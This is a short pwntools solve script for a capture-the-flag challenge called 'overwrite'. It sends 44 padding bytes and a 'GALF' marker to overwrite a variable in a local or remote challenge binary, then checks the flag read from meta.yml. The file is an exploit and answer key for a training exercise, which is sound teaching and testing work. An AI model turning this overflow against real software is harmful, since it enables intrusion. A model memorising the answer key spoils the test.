import argparse
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


# For local binary testing
def solve(sh):
    payload = b"A" * 44
    payload += b"GALF"
    sh.recvuntil(b": ")
    sh.sendline(payload)
    flag = sh.recvline().decode()
    assert FLAG in flag, flag


### IF BINARY ###
def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    ### LOCAL BINARY ###
    parser.add_argument("domain", default="127.0.0.1", nargs="?")
    parser.add_argument("port", default=1337, type=int, nargs="?")
    args = parser.parse_args()
    sh = process("./overwrite")
    solve(sh)
    ### LOCAL BINARY ###
